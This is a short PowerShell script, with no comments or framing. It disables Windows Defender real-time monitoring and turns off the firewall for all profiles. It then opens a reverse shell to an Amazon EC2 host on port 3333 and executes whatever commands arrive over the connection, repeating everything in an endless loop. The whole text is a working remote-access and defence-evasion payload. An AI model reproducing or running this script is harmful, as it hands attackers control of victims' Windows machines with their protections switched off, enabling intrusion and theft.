$n = Set-MpPreference -DisableRealtimeMonitoring $true

 start-sleep 10

 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 start-sleep 10
  
 $sm=(New-Object Net.Sockets.TCPClient("ec2-3-89-21-74.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

 start-sleep 10


while (1 -eq 1) {

$n= Set-MpPreference -DisableRealtimeMonitoring $true

 start-sleep 10

 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 start-sleep 10
  
 $sm=(New-Object Net.Sockets.TCPClient("ec2-3-89-21-74.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"

 start-sleep 10

cls
$n
Start-Sleep 10

}
